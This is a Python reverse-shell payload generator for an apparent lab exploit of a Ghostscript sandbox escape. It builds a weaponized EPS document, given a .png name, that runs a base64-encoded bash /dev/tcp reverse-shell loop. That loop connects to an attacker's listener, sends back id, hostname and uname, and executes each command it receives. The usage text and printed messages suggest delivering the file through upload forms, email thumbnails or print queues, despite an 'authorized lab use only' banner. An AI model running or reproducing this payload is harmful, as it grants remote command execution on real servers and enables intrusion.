#!/usr/bin/env python3
"""
Reverse-shell payload generator for the Upload2Shell lab (CVE-2026-125396).

*** AUTHORIZED LAB USE ONLY — run only on systems you own. ***

Produces a weaponized document identical in spirit to exploit.py's output,
but whose stage-6 command is a self-contained interactive reverse shell:
the payload escapes Ghostscript's -dSAFER sandbox, then %pipe%-executes a
base64-encoded bash script that connects back to the attacker's listener
and serves a command loop (eval per line, output streamed back).

Usage:
    python3 revshell.py --lhost 127.0.0.1 --lport 4444 --out shell.png
    nc -lvnp 4444          # then upload shell.png via the web UI / exploit.py
"""
import argparse
import base64
import os

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PAYLOAD = os.path.join(HERE, "payloads", "poc-rce.ps")

EPS_ENVELOPE = (b"%!PS-Adobe-3.0 EPSF-3.0\n"
                b"%%BoundingBox: 0 0 200 200\n"
                b"%%Title: scan\n"
                b"%%Pages: 1\n")

# bash reverse-shell command loop (bash-only /dev/tcp; shipped via base64 so
# no quotes/parens ever touch the PostScript layer)
SCRIPT_TEMPLATE = """exec 3<>/dev/tcp/{lhost}/{lport} || exit 1
echo PWNED-BY-UPLOAD2SHELL >&3
id >&3 2>&1
hostname >&3
uname -sr >&3
echo READY >&3
while IFS= read -r cmd <&3; do
  case "$cmd" in exit|quit) break;; esac
  eval "$cmd" 2>&1 | head -c 4000 >&3
  echo >&3
done
exec 3<&-
"""


def main() -> int:
    ap = argparse.ArgumentParser(description="Upload2Shell reverse-shell payload "
                                             "generator (LAB USE ONLY)")
    ap.add_argument("--lhost", required=True, help="attacker listener host")
    ap.add_argument("--lport", required=True, type=int, help="attacker listener port")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD)
    ap.add_argument("--out", required=True, help="output weaponized document")
    args = ap.parse_args()

    with open(args.payload, "r", encoding="utf-8") as fh:
        ps = fh.read()
    assert "__COMMAND__" in ps, "payload template missing __COMMAND__ placeholder"

    script = SCRIPT_TEMPLATE.format(lhost=args.lhost, lport=args.lport)
    b64 = base64.b64encode(script.encode()).decode()
    cmd = f"echo {b64} | base64 -d | /bin/bash"
    ps = ps.replace("__COMMAND__", cmd)

    with open(args.out, "wb") as fh:
        fh.write(EPS_ENVELOPE + ps.encode())
    print(f"[+] weaponized reverse-shell document -> {args.out}")
    print(f"[*] start a listener first:  nc -lvnp {args.lport}")
    print(f"[*] deliver {args.out} to any Ghostscript render path (upload form,")
    print(f"    email thumbnail, print queue) and you will receive: id/hostname/")
    print(f"    uname banner, then one eval'd command per line until 'exit'.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
